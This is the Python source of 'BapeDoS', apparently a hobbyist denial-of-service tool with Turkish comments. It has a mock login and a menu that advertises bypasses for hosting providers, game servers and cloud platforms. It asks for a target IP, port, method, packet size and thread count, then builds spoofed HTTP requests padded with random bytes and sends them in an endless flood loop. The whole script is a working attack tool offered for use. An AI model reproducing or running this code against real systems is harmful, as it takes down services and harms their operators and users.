#Önce im- Önce bismillah sonra import evet 0=)

try:
    import socks, requests, wget, cfscrape, urllib3, os, sys, pyttsx3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy os sys")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy os sys")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy os sys rich threading random socket time")
...
os.system('color ' +random.choice(['9'])+ " & cls & title BapeDoS V5 [30.12.2021]")
print(" ")
print("""
...
                                                                        
            ...
            Much Powerfull Tool Coded by xBapeReal#8915 !      
                |-|  MHD Penetration Plugin Test |-|
                    * Enter Your Name For Login *
  
    """)
print("""
""")
kullanici_adi = str(input("""

            Please Input Username:
            
            [Account Manager+] """))
print("")
if kullanici_adi == "xBape" or "xbape" or "xBapeReal" or "root":
    os.system('color b')
    print("            [Checker Beta] Checking Datas")
    sleep(2)
    os.system('color c')
    print(f"            [Checker Beta] Trying to find name {kullanici_adi}")
    sleep(3)
    print("")
    os.system('color a')
    print("            [Auther] " + kullanici_adi + " Logged In!")
    time.sleep(3)
    os.system('cls')
    print("""
    
        Redirecting To: Panel v2.1
    ...
    [Sock4]
    [Sock5]
    [H*stingEvim] (BYPASSED!)
    [GTPS]
    [Website]
    [GTA RP]
    [Rigor Z]
    [Roblox] (UDP methods You need Purhcase!)
    [Azure, Vultr, Amazon] (Ez bypass)
    [OVH-SAS, Any ovh] (BYPASS)
    [Hosts] (Curl Bypass)
    [Home] (NFO Currently maintance.)
    
    
    
    ENTER 5 DIGIT CODE IN DISCORD!
    (Add Your 5 Digit Code to 5_Digit_Code.txt)
    
    """)

digit_code = str(input("Enter Digit Code:"))
if digit_code == "58765":
    print("Correct!")
    os.system('cls')
else:  
...
print("""
 ...
 \______   \___.__.     ___  __\______   \_____  ______   ____\______   \ ____ _____  |  |  
  |    |  _<   |  |     \  \/  /|    |  _/\__  \ \____ \_/ __ \|       _// __ \\__  \ |  |  
  |    |   \\___  |      >    < |    |   \ / __ \|  |_> >  ___/|    |   \  ___/ / __ \|  |__
  |______  // ____|     /__/\_ \|______  /(____  /   __/ \___  >____|_  /\___  >____  /____/
         \/ \/                \/       \/      \/|__|        \/       \/     \/     \/      
        """)
time.sleep(3)
...
referers = [
     'Your_Server_Bypassed_by_xBapeReal',
     'Your_Server_Bypassed_by_xBapeReal',
     'Your_Server_Bypassed_by_xBapeReal',
     'Your_Server_Bypassed_by_xBapeReal',
     'Your_Server_Bypassed_by_xBapeReal',
...
#Coded by xBapeReal TÜRKLERIN GÜCÜNÜ GÖRECEKSINIZ!
if sys.platform.startswith("linux"):
   os.system('clear')
elif sys.platform.startswith("freebsd"):
   os.system('clear')
else:
   os.system('color ' +random.choice(['E'])+ " & cls & title BapeDoS [Attack Page 1-1]")
print(" ")
print("""
...
target_ip = str(input(f" [MHD@{kullanici_adi}] IP --> ")) 
os.system('cls')
print(" ")
print("""
                    ██   ██ ██████   █████  ██████  ███████ ██████  ███████  █████  ██      
...
print("""
""")
print(" Useful Ports: 80, 3389, 17091 (UDP)")
port = int(input(f" [MHD@{kullanici_adi}] Port: "))
os.system('cls')
...
print("""
                    ...
                                                                                            
                                                                                            """)
print(" Methods: Get Method POST Head OVH(NEW!) MHD(powerful)   ")
print(" FOR BYPASS HOSTINGEVIM: HostNull")
print("")
attack_methods = str(input(f" [MHD@{kullanici_adi}] Select a Method: "))
os.system('cls')
print("")
print("""
                    ...
                                                                                            
                                                                                            """)
print(" Packets: 55555, 77777")
print("")
packet = int(input(f" [MHD@{kullanici_adi}]] Enter Packet: "))
os.system('cls')
...
print('''
                    ...
                                                                                            
                                                                                            ''')
print("55000, 90048, 300000")
print("")
threads = int(input(f" [MHD@{kullanici_adi}] Enter Thread: "))
...
def Headers(method):
    header = ""
    if method == "get" or method == "head" or method == "MHD" or method == "HostNull" or method == "OVH":
        post_host = "POST /Your_Server_Bypassed_By_xBapeReal HTTP/1.1\r\nHost: " + target_ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        accept = random.choice(acceptall) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        referer = "Referer: " + random.choice(referers) + target_ip + "\r\n"
    ...
    return header
os.system('color ' +random.choice(['D'])+ " & cls & title xBapeDos [Attack_Basarili]")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(90048)
    if attack_methods == "1":
        get_host = "GET /Your_Server_Bypassed_By_xBapeReal HTTP/1.1\r\nHost: " + target_ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD','MHD','HostNull','OVH']) + " /Your_Server_Bypassed_By_xBapeReal HTTP/1.1\r\nHost: " + target_ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
...
`:`:::::::`;:::::: ;::::::#/               DOO  ███    ███                     
 ...
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#       ''')
console = Console()
table = Table("bold red")
table = Table(box=box.DOUBLE)
table.add_column("User", justify="center")
table.add_column("Coder", justify="center")
table.add_column("Locked on", justify="center")
table.add_column("Method",justify="center")
table.add_column("Port",justify="center")
table.add_column("Packets",justify="center")
table.add_column("Threads",justify="center")
table.add_column("Version",justify="center")
table.add_row(

    "" +kullanici_adi+ ""    ,"xBapeReal#1337" , "" +target_ip+''  ,''+attack_methods+'', ""+str(port)+'', ""+str(packet)+'', ""+str(threads)+'', "xBapeDoS V7", 
)
console.print(table)
